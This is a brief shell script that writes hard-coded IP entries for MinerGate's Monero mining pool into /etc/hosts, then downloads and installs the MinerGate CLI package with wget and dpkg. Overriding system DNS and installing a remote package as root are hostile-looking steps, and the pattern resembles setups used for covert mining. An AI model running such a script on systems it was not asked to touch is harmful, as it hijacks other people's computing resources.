#!/bin/sh
echo "88.99.142.163 minergate.com" >> /etc/hosts
echo "94.130.48.154 xmr.pool.minergate.com" >> /etc/hosts
echo "78.46.23.253 xmr.pool.minergate.com" >> /etc/hosts
echo "136.243.88.145 xmr.pool.minergate.com" >> /etc/hosts
echo "136.243.102.157 xmr.pool.minergate.com" >> /etc/hosts
echo "94.130.9.194 xmr.pool.minergate.com" >> /etc/hosts
echo "176.9.147.178 xmr.pool.minergate.com" >> /etc/hosts
echo "176.9.0.89 xmr.pool.minergate.com" >> /etc/hosts
echo "94.130.64.225 xmr.pool.minergate.com" >> /etc/hosts
echo "46.4.120.155 xmr.pool.minergate.com" >> /etc/hosts
echo "136.243.94.27 xmr.pool.minergate.com" >> /etc/hosts
echo "176.9.47.243 xmr.pool.minergate.com" >> /etc/hosts
wget -O minergate.deb https://minergate.com/download/deb-cli
dpkg -i minergate.deb
